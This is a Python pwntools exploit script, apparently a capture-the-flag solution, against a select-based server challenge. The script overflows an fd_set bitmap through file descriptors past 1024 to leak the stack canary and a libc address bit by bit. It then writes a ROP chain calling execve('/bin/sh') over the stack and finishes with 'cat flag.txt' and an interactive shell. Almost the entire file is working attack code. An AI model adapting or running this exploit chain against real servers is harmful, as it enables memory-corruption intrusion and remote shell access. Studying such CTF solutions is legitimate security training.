#!/usr/bin/env python3
# a POC for reading the canary and after
# is possible to set the canary and memory after to some value and exit (triggering a ROP)
from pwn import process, remote, args, gdb, context, ELF, ROP, u64, log, flat, ui

remotehost = ("localhost", 10005)
exe = context.binary = ELF("../src/chall")
libc = ELF("libc.so.6") if args.REMOTE else exe.libc

gdb_script = """
b *server+479
b *server+1286
c
x/16a $rsp+0x1c8-0x18
del 1
c
"""
# x/100a ((char*)&rfds+128)
# """
# # c
# # u 1
# # x/32bx ((char*)&rfds+128)
# # """


def start():
    if args.REMOTE:
        return remote(*remotehost)
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p, gdbscript=gdb_script)
    return p


def send_msg(p, msg, fd, blind=False):
    p.sendline(b'2')
    if not blind:
        p.sendlineafter(b'Enter a message:\n', msg)
        p.sendlineafter(b'Enter a fd:\n', str(fd).encode())
    if blind:
        p.sendline(msg)
        p.sendline(str(fd).encode())


def create_connection(p, msg, fd = None):
    blind = True
    p.sendline(b'1')
    if fd is None:
        p.recvuntil(b'Started a new connection: ')
        fd = int(p.recvline().decode().strip())
        blind = False
    send_msg(p, msg, fd, blind = blind)
    return fd

def batch_create_connection(p, n, msg):
    p.sendline(b'5')
    p.sendlineafter(b'Enter the number of connections:\n', str(n).encode())
    p.sendlineafter(b'Enter a message to send to all connections:\n', msg)
    p.recvuntil(b'file descriptors: ')
    fds = p.recvline().decode().strip()
    while "Server" in fds:
        # in case we have a message from the server during the recv
        fds = fds[:fds.index("Server")]
        fds += p.recvline().decode().strip()
    return list(map(int, fds.split(",")))

def batch_send_msg(p, fd_min, fd_max, msg):
    p.sendline(b'6')
    p.sendlineafter(b'Enter min fd:\n', str(fd_min).encode())
    p.sendlineafter(b'Enter max fd:\n', str(fd_max).encode())
    p.sendlineafter(b'Enter a message to send to all connections:\n', msg)
    p.recvuntil(b'Sent message to all connections!\n')


def close_connection(p, fd):
    p.sendline(b'4')
    p.sendlineafter(b'Enter a fd:\n', str(fd).encode())


def pack_bits(bits, max_num):
    bits = [1 if i in bits else 0 for i in range(max_num)]
    bits += [0] * (-len(bits) % 8)
    return bytes([int(''.join(map(str, bits[i:i+8][::-1])), 2) for i in range(0, len(bits), 8)])


def setup(p):
    """set fd to 1023, next is 1024 that is out of bounds
    """
    _ = batch_create_connection(p, 8*(128) - 3, b"Hello")

def read_mem(p, write_pos=8*200, interesting_bits = []):
    """assume next fd is at addr = 0, length is in bytes, is necessary to
    write 1 bit at some point after the addr for example 200 bytes after
    """
    if interesting_bits == []:
        interesting_bits = [(0, write_pos)]
    n = 0
    fds = batch_create_connection(p, write_pos, b"Save")
    # test fds are contiguous
    assert fds == list(range(1024, 1024+write_pos))
    with log.progress("Reading memory") as logger:
        for i, fd in enumerate(fds):
            logger.status(f"{i}/{write_pos}")
            if any(i in range(a, b) for a, b in interesting_bits):
                send_msg(p, f"message{i}".encode(), fd)
            else:
                for j, (a,b) in enumerate(interesting_bits):
                    if b == i:
                        end = interesting_bits[(j+1)][0] if j+1 < len(interesting_bits) else write_pos
                        batch_send_msg(p, fds[i], fds[end], b"Save")
            n += 1
    log.info("Created structures to read mem")
    fd = create_connection(p, b"Hello")

    bits = []

    with log.progress("Packing bits") as logger:
        while True:
            msg = p.recvuntil(b'Server: I received message', timeout=2)
            if msg == b'':
                print("No message received")
                break
            num = int(p.recvline().decode().split(" ")[0])

            bits.append(num)
            logger.status(f"{len(bits)}")

            send_msg(p, b"Save", 1024+num)


    close_connection(p, fd)
    bs = pack_bits(bits, write_pos)
    return bs


def main():
    io = start()
    if not args.REMOTE:
        ui.pause()
    setup(io)

    # read bytes starting 8 bytes before the canary
    bs = read_mem(io, 8*0x1f0, interesting_bits=[(8*0x8, 8*0x10), (8*0x1e8, 8*0x1f0)])

    canary = u64(bs[0x8:0x10])
    libc_leak = u64(bs[0x1e8:0x1f0])

    libc_start_main_return = libc.functions['__libc_start_main'].address + 128
    libc.address = libc_leak - libc_start_main_return

    log.success(f"{canary = :#018x}")
    log.success(f"{libc.address = :#018x}")

    rop = ROP(libc)

    rop.call(libc.sym['execve'], [next(libc.search(b"/bin/sh\x00")), 0, 0])
    
    log.info("Now sending ROP")
    bs = flat({
        8: canary,
        0x28: rop.chain(),
    })

    fd = create_connection(io, b"Hello")

    with log.progress("Sending ROP") as logger:
        for i, by in enumerate(bs):
            logger.status(f"{i}/{len(bs)}")
            for b in range(8):
                if by & (1 << b):
                    send_msg(io, f"{i*8+b + 1024}".encode(), fd)
                    send_msg(io, b"Exit", i*8+b + 1024)

    send_msg(io, b"cat flag.txt", 3) # 3 is the 0 fd on the server (used as stdin)

    send_msg(io, b"Hello", fd)
    log.success("Enjoy your shell")

    io.interactive()

if __name__ == '__main__':
    main()
